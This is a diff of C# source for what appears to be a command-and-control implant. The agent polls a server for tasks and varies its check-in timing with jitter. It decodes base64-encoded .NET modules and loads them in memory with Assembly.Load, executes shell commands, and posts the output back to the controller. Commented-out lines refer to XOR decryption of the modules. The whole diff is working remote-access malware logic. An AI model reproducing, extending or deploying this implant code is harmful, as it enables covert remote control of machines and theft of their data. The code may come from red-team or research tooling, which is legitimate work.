@@ -15,6 +15,8 @@ using System.Collections.Generic;
 using System.Net.Http;
 using System.Text.Json.Serialization;
 using System.Net.Http.Json;
+using Agent.Core;
+using System.Reflection;
 
 
 // #if TYPE_http
@@ -28,11 +30,9 @@ var messageQueueLock = new object();
 var commandOutputQueue = new ConcurrentQueue<string>();
 var rnd = new Random();
 var agentInfo = await agentInformationService.GetAgentInfoAsync();
-ICommand command;
 
 // Load the embedded config
 var baseConfig = ConfigLoader.LoadEmbeddedConfig();
-
 
 if (agentInfo is not null)
 {
@@ -75,6 +75,12 @@ while (true)
     {
         using (var client = new HttpClient())
         {
+            if (baseCommunicationService.BaseConfig is null)
+            {
+                Console.WriteLine("BaseConfig is null.");
+                Environment.Exit(1);
+            }
+
             var taskRequest = new C2Request { Reason = "task", AgentId = baseCommunicationService.BaseConfig.AgentId, AgentStatus = "active" };
             var result = await baseCommunicationService.SimplePostAsync($"/", JsonSerializer.Serialize(taskRequest));
 
@@ -86,10 +92,90 @@ while (true)
                 var tasks = JsonSerializer.Deserialize<List<AgentTask>>(taskResponse.Message);
                 if (tasks is null || tasks.Count == 0) continue;
 
+                foreach (var task in tasks)
+                {
+                    if (task is null) continue;
 
+                    if (task.TaskCompleted > DateTime.MinValue) continue;
+
+                    Console.WriteLine(JsonSerializer.Serialize(task));
+
+                    if (!string.IsNullOrWhiteSpace(task.Module) && task.Status is not "Running")
+                    {
+                        task.QueueRunningStatus(messageQueue, messageQueueLock);
+
+                        //ModuleLoadContext loadContext = new();
+                        using (var stream = new MemoryStream())
+                        {
+                            var decodedModule = Convert.FromBase64String(task.Module);
+                            //var decodedModule = urlSafeBase64DecodingDecorator.Transform(task.Module);
+                            //stream.Write(decodedModule);
+                            //loadContext.AssemblyBytes = stream;
+                            //stream.Position = 0;
+                            //var loadedAssembly = loadContext.LoadFromStream(stream);
+
+                            //var decryptedModule = xorDecryptionDecorator.Transform(decodedModule);
+                            //var decryptedBytes = Encoding.UTF8.GetBytes(decryptedModule);
+                            var module = ModuleLoader.LoadModule(Assembly.Load(decodedModule));
+                            foreach (var moduleCommand in module.Commands)
+                            {
+                                try
+                                {
+                                    task.Command.Output = ExecuteCommand(moduleCommand, task.Command.Parameters, task.IsCancellationTokenSourceSet);
+                                }
+                                catch (Exception)
+                                {
+                                    while (commandOutputQueue.TryDequeue(out var commandOutputResult))
+                                    {
+                                        task.Command.Output += commandOutputResult;
+                                    }
+                                }
+                            }
+                        }
+
+                        task.Module = string.Empty;
+                    }
+
+                    lock (taskQueueLock)
+                    {
+                        if (task is not null)
+                            taskQueue.Enqueue(task);
+                    }
+
+                    if (task!.Status is not "Running")
+                        task!.QueueQueuedStatus(messageQueue, messageQueueLock);
+                }
+
+                await HandleQueuedTasks();
+
+                // Flush message queue for now
+                List<AgentTask?> agentTasks = [];
+                lock (messageQueueLock)
+                {
+                    while (messageQueue.TryDequeue(out var queueData))
+                    {
+                        if (queueData is not null)
+                            agentTasks.Add(queueData);
+                    }
+                }
+
+                foreach (var agentTask in agentTasks)
+                {
+                    var taskUpdateRequest = new C2Request
+                    {
+                        AgentId = baseCommunicationService.BaseConfig.AgentId,
+                        AgentStatus = "Active",
+                        Reason = "response",
+                        Message = JsonSerializer.Serialize(agentTask)
+                    };
+
+                    await baseCommunicationService.SimplePostAsync("/", JsonSerializer.Serialize(taskUpdateRequest));
+                }
             }
-
-
+            else
+            {
+                Console.WriteLine($"[{DateTime.UtcNow}]:\tDid not connect to server");
+            }
 
             int realJitter = delay * (jitter / 100);
             if (rnd.Next(2) == 0) { realJitter = -realJitter; }
@@ -116,15 +202,15 @@ async Task HandleTask(AgentTask task)
     {
         // When the SetDelay TaskType is set, the 2nd param always needs a value
         // -1 will set Delay only and skip changing jitter
-        case AgentTaskType.SetDelay:
+        case "SetDelay":
             delay = Convert.ToInt32(task.Command.Parameters[1]);
             var jitterParam = Convert.ToInt32(task.Command.Parameters[2]);
             jitter = jitterParam != -1 ? jitterParam : jitter;
             break;
-        case AgentTaskType.SetJitter:
+        case "SetJitter":
             jitter = Convert.ToInt32(task.Command.Parameters[1]);
             break;
-        case AgentTaskType.ShellCommand:
+        case "ShellCommand":
             await Task.Run(async () =>
             {
                 task.Command.CommandStarted = DateTime.UtcNow;
@@ -132,7 +218,7 @@ async Task HandleTask(AgentTask task)
                 task.Command.CommandCompleted = DateTime.UtcNow;
             });
             break;
-        case AgentTaskType.Exit:
+        case "Exit":
             break;
     }
 
